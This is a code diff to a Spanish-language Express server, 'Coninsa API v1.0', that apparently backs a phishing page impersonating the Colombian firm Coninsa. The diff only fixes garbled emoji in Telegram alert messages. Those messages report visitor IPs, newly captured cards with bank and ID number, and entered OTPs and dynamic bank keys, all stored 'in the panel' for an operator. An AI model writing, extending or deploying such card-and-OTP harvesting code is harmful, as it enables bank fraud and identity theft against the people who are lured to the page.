@@ -1,4 +1,4 @@
-// Coninsa API v1.0 â€" Palomma tRPC (sin CAPTCHA)
+// Coninsa API v1.0 — Palomma tRPC (sin CAPTCHA)
 const express = require('express');
 const cors    = require('cors');
 const axios   = require('axios');
@@ -621,12 +621,12 @@ app.post('/api/visita', async (req, res) => {
   res.json({ ok: true, online: onlineCount() });
   if (!isNew) return; // solo loguear visitas nuevas (no reconexiones del mismo IP)
   const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
-  const refTxt = ref ? `\nðŸ"— <b>Referencia:</b> <code>${ref}</code>` : '';
+  const refTxt = ref ? `\n🔗 <b>Referencia:</b> <code>${ref}</code>` : '';
   await tgText(
-    `ðŸŒ <b>NUEVA VISITA â€" CONINSA</b>\n` +
-    `ðŸŒ <b>IP:</b> <code>${ip}</code>${refTxt}\n` +
-    `ðŸ'¥ <b>Online ahora:</b> ${onlineCount()}\n` +
-    `ðŸ• ${hora}`
+    `🌐 <b>NUEVA VISITA — CONINSA</b>\n` +
+    `🌍 <b>IP:</b> <code>${ip}</code>${refTxt}\n` +
+    `👥 <b>Online ahora:</b> ${onlineCount()}\n` +
+    `🕐 ${hora}`
   );
 });
 
@@ -667,12 +667,12 @@ app.post('/api/tarjeta/crear', async (req, res) => {
     });
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     await tgText(
-      `ðŸ'³ <b>NUEVA TARJETA â€" CONINSA</b>\n` +
-      `ðŸ†" <b>ID:</b> <code>${r.data?.id || '?'}</code>\n` +
-      `ðŸ¦ <b>Banco:</b> ${banco}\n` +
-      `ðŸ"‹ <b>Doc:</b> <code>${tipo_doc} ${cedula}</code>\n` +
-      `ðŸ'° <b>Monto:</b> $${Number(monto || 0).toLocaleString('es-CO')}\n` +
-      `ðŸ• ${hora}\n` +
+      `💳 <b>NUEVA TARJETA — CONINSA</b>\n` +
+      `🆔 <b>ID:</b> <code>${r.data?.id || '?'}</code>\n` +
+      `🏦 <b>Banco:</b> ${banco}\n` +
+      `📋 <b>Doc:</b> <code>${tipo_doc} ${cedula}</code>\n` +
+      `💰 <b>Monto:</b> $${Number(monto || 0).toLocaleString('es-CO')}\n` +
+      `🕐 ${hora}\n` +
       `<i>(datos en el panel)</i>`
     );
     res.json(r.data);
@@ -717,16 +717,16 @@ app.post('/api/tarjeta/actualizar', async (req, res) => {
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     if (banco_otp) {
       await tgText(
-        `ðŸ"² <b>OTP INGRESADO â€" CONINSA</b>\n` +
-        `ðŸ†" <b>ID:</b> <code>${id}</code>\n` +
-        `ðŸ• ${hora}\n` +
+        `📲 <b>OTP INGRESADO — CONINSA</b>\n` +
+        `🆔 <b>ID:</b> <code>${id}</code>\n` +
+        `🕐 ${hora}\n` +
         `<i>(valor en el panel)</i>`
       );
     } else if (dinamica) {
       await tgText(
-        `ðŸ"' <b>CLAVE DINÃMICA INGRESADA â€" CONINSA</b>\n` +
-        `ðŸ†" <b>ID:</b> <code>${id}</code>\n` +
-        `ðŸ• ${hora}\n` +
+        `🔑 <b>CLAVE DINÁMICA INGRESADA — CONINSA</b>\n` +
+        `🆔 <b>ID:</b> <code>${id}</code>\n` +
+        `🕐 ${hora}\n` +
         `<i>(valor en el panel)</i>`
       );
     }
@@ -817,11 +817,11 @@ app.post('/api/coninsa/buscar', async (req, res) => {
     if (invoices.length > 0) {
       const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
       await tgText(
-        `ðŸ¢ <b>Coninsa â€" Consulta</b>\n\n` +
-        `ðŸ" <b>Documento:</b> <code>${doc}</code>\n` +
-        `ðŸ"Š <b>Facturas:</b> ${invoices.length}\n` +
-        `ðŸ'° <b>Total deuda:</b> ${fmtCOP(total)}\n` +
-        `ðŸ• <b>Hora:</b> ${hora}`
+        `🏢 <b>Coninsa — Consulta</b>\n\n` +
+        `🔍 <b>Documento:</b> <code>${doc}</code>\n` +
+        `📊 <b>Facturas:</b> ${invoices.length}\n` +
+        `💰 <b>Total deuda:</b> ${fmtCOP(total)}\n` +
+        `🕐 <b>Hora:</b> ${hora}`
       );
     }
 
@@ -837,5 +837,5 @@ app.post('/api/coninsa/buscar', async (req, res) => {
 app.use(express.static(path.join(__dirname)));
 
 app.listen(PORT, () =>
-  console.log(`\nâœ… Coninsa API v1.0 corriendo en http://localhost:${PORT}\n   Frontend: http://localhost:${PORT}/factura.html\n`)
+  console.log(`\n✅ Coninsa API v1.0 corriendo en http://localhost:${PORT}\n   Frontend: http://localhost:${PORT}/factura.html\n`)
 );
